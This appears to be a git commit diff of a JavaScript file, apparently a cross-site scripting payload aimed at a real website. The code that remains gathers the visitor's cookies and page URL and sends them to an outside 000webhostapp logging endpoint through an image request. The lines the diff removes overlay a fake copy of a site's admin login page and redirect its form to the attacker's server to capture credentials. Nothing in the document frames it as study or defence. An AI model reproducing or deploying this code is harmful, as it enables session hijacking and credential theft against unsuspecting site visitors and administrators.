2b7bf206a35308e2884895c83657050237613087
9os <druidboykoston@gmail.com>
2017-04-28 23:31:12 -0600

    Add files via upload

--- a.js
+++ a.js
@@ -1,5 +1,3 @@
-jQuery("script[src='//rawgit.com/9os/a/a/a.js']").after("Elysium PVP Alliance");
-
 //Gen data
 cookie = "Cookies:"+document.cookie;
 url = "URL:"+document.location;
@@ -8,23 +6,6 @@ $data = encodeURIComponent(cookie+url);
 
 var imageObject = new Image();
 imageObject.src = "http://g4wowisbad.000webhostapp.com/log.php?log="+$data;
-
-//Let page load first
-document.head.innerHTML = "<style>#login_iframe{width:100%;height:100%;border:none;position:absolute;left:0;top:0;overflow:hidden;z-index:1000000000000000;}</style>" + document.head.innerHTML;
-document.body.innerHTML = "<iframe scrolling='no' onload=\"this.style.background='#222 url(\'images/bg-login.gif\')'\" id='login_iframe' src='https://www.lvlgo.com/admin_lvlgo/Login.aspx'></iframe>" + document.body.innerHTML;
-var prevTitle = document.title;
-document.title = "网站管理系统";
-
-$("#login_iframe").load(function(){
-	//alert("Loaded");
-	$("#login_iframe").contents().find("#form1")[0].action = "//g4wowisbad.000webhostapp.com/login.php";
-	$("#login_iframe").contents().find("#txtUsername")[0].value = getCookie("login_name");
-	$("#login_iframe").contents().find("#form1").submit(function(){
-		$("#login_iframe").attr("src", "https://www.lvlgo.com/admin_lvlgo/Login.aspx");
-		$("#login_iframe").delay(1000).hide(0);
-		document.title = prevTitle;
-	});
-});
 
 function getCookie(cname) {
     var name = cname + "=";
